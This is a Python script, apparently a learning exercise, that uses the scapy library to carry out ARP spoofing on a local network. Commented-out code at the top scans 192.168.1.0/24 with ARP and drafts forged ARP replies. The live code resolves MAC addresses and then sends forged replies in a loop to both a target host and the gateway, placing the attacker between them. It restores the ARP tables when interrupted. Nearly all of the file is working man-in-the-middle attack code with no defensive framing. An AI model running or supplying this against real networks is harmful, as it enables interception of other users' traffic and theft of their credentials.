# import scapy.all as scapy
# def scan(ip):
#     client_list = []
#     answered_list = scapy.arping(ip)
#     for element in answered_list[0]:
#         client_dict = {"ip": element[1][0].psrc, "mac": element[1][0].hwsrc}
#         client_list.append(client_dict)
#     return client_list
#
# print(scan('192.168.1.1/24'))

# def scan(ip):
#     arp_request = scapy.ARP(pdst=ip)
#     # arp_request.pdst = ip
#     # print(arp_request.summary())  # who have ip ...
#     # scapy.ls(scapy.ARP()) # print all field pdst ...
#     boadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
#     # scapy.ls(scapy.Ether())
#     # print(boadcast.summary())
#     arp_request_boadcast = boadcast/arp_request
#     answered, unansewered = scapy.srp(arp_request_boadcast, timeout=1)  # return list[]
#     print(answered.summary())
# scan("192.168.1.1/24")
# packet = scapy.ARP(op=2, pdst='192.168.1.120', hwdst='00-6d-52-68-64-4b', psrc='192.168.1.1')
# packet = scapy.ARP(op=2, pdst='192.168.1.118', hwdst='0c-9d-92-70-ae-b1', psrc='192.168.1.1')

# print(packet.show())
# print(packet.summary())
# while True:
#     scapy.send(packet)
import scapy.all as scapy
import time


def getmac(ip):
    answered_list = scapy.arping(ip, verbose=False)
    return answered_list[0][0][1].hwsrc


def spoof(target_ip,spoof_ip):
    target_mac = getmac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = getmac(destination_ip)
    source_mac = getmac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)  #send packet four times to make sure this sent


target_ip = '192.168.1.120'
gateway_ip = '192.168.1.1'
try:
    sent_backet_count = 0
    while True:
        try:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_backet_count += 2
            print(f'[+] sent {sent_backet_count} backets')
            time.sleep(2)
        except IndexError:
            pass
except KeyboardInterrupt:
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

